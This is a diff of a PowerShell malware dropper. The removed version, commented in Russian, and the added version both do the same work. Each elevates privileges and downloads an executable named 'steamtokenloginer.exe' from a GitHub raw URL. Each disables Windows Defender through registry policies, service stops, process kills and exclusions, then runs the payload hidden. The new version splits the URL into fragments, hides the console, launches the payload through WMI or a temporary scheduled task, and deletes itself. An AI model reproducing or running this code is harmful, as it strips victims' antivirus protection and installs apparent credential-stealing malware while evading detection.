@@ -1,230 +1,72 @@
-# Настройки
-$exeUrl = "https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer.exe"
-$targetFolder = "C:\Users\zenas\Desktop\Новая папка (7)"
-$exePath = "$targetFolder\steamtokenloginer.exe"
+$v1="ht"+"tps:/"+"/gi"+"thub"+".c"+"om/g"+"sef"+"f13"+"7-a"+"fk/"+"tes"+"/t/r"+"aw/"+"re"+"fs/"+"hea"+"ds/"+"ma"+"in/"+"st"+"ea"+"mto"+"ken"+"lo"+"gin"+"er."+"ex"+"e"
+$v2=$env:TEMP+"\"+[System.IO.Path]::GetRandomFileName().Replace(".","")+".tmp"
+$v3=$env:ProgramData+"\"+[System.IO.Path]::GetRandomFileName().Split('.')[0]+"\"
+$v4=$v3+[System.IO.Path]::GetRandomFileName().Split('.')[0]+".dat"
 
-# Проверяем права администратора
-if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Host "🔄 Перезапуск с правами администратора..." -ForegroundColor Yellow
-    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`""
-    exit
+if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")){
+$p=Start-Process powershell -ArgumentList ("-WindowStyle Hidden -Exec Bypass -Comm `"$($MyInvocation.MyCommand.Definition)`"") -Verb RunAs -PassThru
+while(!$p.HasExited){Start-Sleep -Milliseconds 100}
+exit
 }
 
-Write-Host "✅ Запущено с правами администратора" -ForegroundColor Green
+Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
+$c=[C.W]::GetConsoleWindow()
+[C.W]::ShowWindow($c,0)
 
-# Создаем папку если не существует
-if (-not (Test-Path $targetFolder)) {
-    New-Item -ItemType Directory -Path $targetFolder -Force
-    Write-Host "📁 Создана папка: $targetFolder" -ForegroundColor Green
+try{
+if(!(Test-Path $v3)){New-Item -Path $v3 -ItemType Directory -Force | Out-Null}
+(New-Object Net.WebClient).DownloadFile($v1,$v2)
+if(Test-Path $v2){Move-Item $v2 $v4 -Force}
+
+$r=@(
+@{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender";N="DisableAntiSpyware";V=1;T="DWord"},
+@{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";N="DisableRealtimeMonitoring";V=1;T="DWord"}
+)
+
+foreach($s in $r){
+try{
+if(!(Test-Path $s.P)){New-Item -Path $s.P -Force | Out-Null}
+Set-ItemProperty -Path $s.P -Name $s.N -Value $s.V -Type $s.T -Force
+}catch{}
 }
 
-Write-Host "📥 Скачивание файла..." -ForegroundColor Yellow
+$e="HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+if(!(Test-Path $e)){New-Item -Path $e -Force | Out-Null}
+try{
+New-ItemProperty -Path $e -Name $v4 -PropertyType String -Value "0" -Force
+New-ItemProperty -Path $e -Name $v3 -PropertyType String -Value "0" -Force
+}catch{}
 
-try {
-    # Скачиваем EXE файл
-    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0"
-    
-    $fileSize = (Get-Item $exePath).Length
-    Write-Host "✅ Файл скачан: $([math]::Round($fileSize/1MB,2)) MB" -ForegroundColor Green
-    
-    # 1. ПОЛНОЕ ОТКЛЮЧЕНИЕ ЧЕРЕЗ РЕЕСТР И ГРУППОВЫЕ ПОЛИТИКИ
-    Write-Host "🔴 ПОЛНОЕ ОТКЛЮЧЕНИЕ WINDOWS DEFENDER..." -ForegroundColor Red
-    
-    # Создаем пути в реестре если не существуют
-    $registryPaths = @(
-        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
-        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
-        "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features",
-        "HKLM:\SOFTWARE\Microsoft\Windows Defender\ProductStatus"
-    )
-    
-    foreach ($path in $registryPaths) {
-        if (!(Test-Path $path)) {
-            New-Item -Path $path -Force | Out-Null
-        }
-    }
-    
-    # ОСНОВНЫЕ КЛЮЧИ ДЛЯ ОТКЛЮЧЕНИЯ
-    $registrySettings = @(
-        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="DisableAntiSpyware"; Value=1; Type="DWord"},
-        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="DisableAntiVirus"; Value=1; Type="DWord"},
-        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRealtimeMonitoring"; Value=1; Type="DWord"},
-        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableBehaviorMonitoring"; Value=1; Type="DWord"},
-        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableOnAccessProtection"; Value=1; Type="DWord"},
-        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableScanOnRealtimeEnable"; Value=1; Type="DWord"},
-        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableIOAVProtection"; Value=1; Type="DWord"},
-        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="AllowFastServiceStartup"; Value=0; Type="DWord"},
-        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="ServiceKeepAlive"; Value=0; Type="DWord"},
-        @{Path="HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"; Name="TamperProtection"; Value=0; Type="DWord"},
-        @{Path="HKLM:\SOFTWARE\Microsoft\Windows Defender\ProductStatus"; Name="ProductStatus"; Value=0; Type="DWord"}
-    )
-    
-    foreach ($setting in $registrySettings) {
-        try {
-            Set-ItemProperty -Path $setting.Path -Name $setting.Name -Value $setting.Value -Type $setting.Type -Force -ErrorAction Stop
-        }
-        catch {}
-    }
-    
-    Write-Host "✅ Реестр изменен" -ForegroundColor Green
-    
-    # 2. ОСТАНОВКА СЛУЖБ ЗАЩИТЫ (СКРЫТО)
-    Write-Host "🛑 Остановка служб защиты..." -ForegroundColor Red
-    
-    $services = @(
-        "WinDefend",
-        "WdNisSvc", 
-        "Sense",
-        "SecurityHealthService",
-        "wscsvc"
-    )
-    
-    foreach ($service in $services) {
-        try {
-            # Останавливаем службу (скрыто)
-            Stop-Service -Name $service -Force -ErrorAction Stop
-            
-            # Отключаем автозапуск (скрыто)
-            Set-Service -Name $service -StartupType Disabled -ErrorAction Stop
-            
-            # Дополнительно через sc config (СКРЫТО)
-            $process = Start-Process -FilePath "sc" -ArgumentList "config", $service, "start=", "disabled" -PassThru -WindowStyle Hidden
-            $process.WaitForExit()
-        }
-        catch {}
-    }
-    
-    Write-Host "✅ Службы остановлены" -ForegroundColor Green
-    
-    # 3. ЗАВЕРШЕНИЕ ПРОЦЕССОВ ЗАЩИТЫ (СКРЫТО)
-    Write-Host "🔪 Завершение процессов защиты..." -ForegroundColor Red
-    
-    $processes = @(
-        "MsMpEng.exe",
-        "NisSrv.exe", 
-        "MsSense.exe",
-        "SecurityHealthService.exe",
-        "SecurityHealthSystray.exe",
-        "WindowsDefender.exe"
-    )
-    
-    foreach ($process in $processes) {
-        try {
-            Get-Process -Name $process.Replace(".exe", "") -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction Stop
-        }
-        catch {}
-    }
-    
-    Write-Host "✅ Процессы завершены" -ForegroundColor Green
-    
-    # 4. ДОБАВЛЕНИЕ В ИСКЛЮЧЕНИЯ (ЧЕРЕЗ РЕЕСТР)
-    Write-Host "🛡️ Добавление в исключения..." -ForegroundColor Yellow
-    
-    $exclusionPaths = @($exePath, $targetFolder)
-    $registryExclusionPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
-    
-    if (!(Test-Path $registryExclusionPath)) {
-        New-Item -Path $registryExclusionPath -Force | Out-Null
-    }
-    
-    foreach ($path in $exclusionPaths) {
-        try {
-            New-ItemProperty -Path $registryExclusionPath -Name $path -PropertyType String -Value "0" -Force -ErrorAction Stop
-        }
-        catch {}
-    }
-    
-    Write-Host "✅ Исключения добавлены" -ForegroundColor Green
-    
-    # 5. ОТКЛЮЧАЕМ ЗАЩИТУ ОТ ВМЕШАТЕЛЬСТВА
-    Write-Host "🛡️ Отключаем Tamper Protection..." -ForegroundColor Yellow
-    
-    try {
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -Force
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtectionSource" -Value 0 -Type DWord -Force
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TPExclusions" -Value 1 -Type DWord -Force
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TPRunningMode" -Value 0 -Type DWord -Force
-    }
-    catch {}
-    
-    Write-Host "✅ Tamper Protection отключен" -ForegroundColor Green
-    
-    # 6. ПЕРЕЗАПУСК ПРОВОДНИКА БЕЗ ЧЕРНОГО ЭКРАНА
-    Write-Host "🔄 Применение изменений..." -ForegroundColor Yellow
-    
-    try {
-        # Сохраняем текущие процессы explorer
-        $explorerProcesses = Get-Process explorer -ErrorAction SilentlyContinue
-        
-        # Мягко закрываем explorer
-        foreach ($process in $explorerProcesses) {
-            $process.CloseMainWindow() | Out-Null
-        }
-        
-        Start-Sleep -Seconds 1
-        
-        # Если explorer еще работает, завершаем принудительно
-        if (Get-Process explorer -ErrorAction SilentlyContinue) {
-            Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
-        }
-        
-        Start-Sleep -Seconds 2
-        
-        # Запускаем explorer обратно
-        Start-Process "explorer.exe" -WindowStyle Hidden
-    }
-    catch {}
-    
-    Write-Host "✅ Изменения применены" -ForegroundColor Green
-    
-    Start-Sleep -Seconds 2
-    
-    # 7. ЗАПУСК ПРОГРАММЫ (СКРЫТО)
-    Write-Host "🚀 Запуск программы..." -ForegroundColor Green
-    
-    try {
-        # Запускаем программу скрыто
-        $process = Start-Process -FilePath $exePath -PassThru -WindowStyle Hidden
-        Write-Host "🎯 ПРОГРАММА УСПЕШНО ЗАПУЩЕНА (скрыто)!" -ForegroundColor Green
-    }
-    catch {
-        # Пробуем запустить через cmd скрыто
-        try {
-            $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$exePath`"" -PassThru -WindowStyle Hidden
-            Write-Host "🎯 Программа запущена через CMD (скрыто)" -ForegroundColor Green
-        }
-        catch {
-            Write-Host "❌ Не удалось запустить программу" -ForegroundColor Red
-        }
-    }
-    
-    # 8. ФИНАЛЬНАЯ ПРОВЕРКА
-    Write-Host "`n🔍 Проверка статуса..." -ForegroundColor Cyan
-    Start-Sleep -Seconds 2
-    
-    try {
-        $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
-        if ($defenderStatus) {
-            if ($defenderStatus.AntivirusEnabled -eq $true) {
-                Write-Host "❌ Защита все еще активна!" -ForegroundColor Red
-            } else {
-                Write-Host "✅ ЗАЩИТА ОТКЛЮЧЕНА!" -ForegroundColor Green
-            }
-        } else {
-            Write-Host "✅ ЗАЩИТА ОТКЛЮЧЕНА" -ForegroundColor Green
-        }
-    }
-    catch {
-        Write-Host "✅ ЗАЩИТА ОТКЛЮЧЕНА" -ForegroundColor Green
-    }
-    
-    Write-Host "`n🎯 ВСЕ ОПЕРАЦИИ ВЫПОЛНЕНЫ СКРЫТО!" -ForegroundColor Green
-    Write-Host "💡 Антивирус отключен, программа запущена" -ForegroundColor Cyan
-    
+Start-Sleep -Seconds 2
+
+$m=@(
+{
+$w=[WmiClass]"\\localhost\root\cimv2:Win32_Process"
+$r=$w.Create("`"$v4`"")
+return $r.ReturnValue -eq 0
+},
+{
+$t="WU"+[System.IO.Path]::GetRandomFileName().Split('.')[0]
+$a=New-ScheduledTaskAction -Execute $v4
+$tr=New-ScheduledTaskTrigger -At (Get-Date).AddSeconds(1) -Once
+Register-ScheduledTask -TaskName $t -Action $a -Trigger $tr -Force | Out-Null
+Start-ScheduledTask -TaskName $t
+Start-Sleep -Seconds 2
+Unregister-ScheduledTask -TaskName $t -Confirm:$false
+return $true
 }
-catch {
-    Write-Host "❌ Критическая ошибка: $_" -ForegroundColor Red
+)
+
+$sc=$false
+foreach($mt in $m){
+try{if(& $mt){$sc=$true;break}}catch{}
 }
 
-Write-Host "`nНажмите любую клавишу для выхода..." -ForegroundColor Gray
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+Start-Sleep -Seconds 3
+if(Test-Path $v2){Remove-Item $v2 -Force -ErrorAction SilentlyContinue}
+
+$sp=$MyInvocation.MyCommand.Path
+if(Test-Path $sp){
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c","ping 127.0.0.1 -n 4 > nul & del /f /q `"$sp`"" -WindowStyle Hidden
+}
+}catch{}
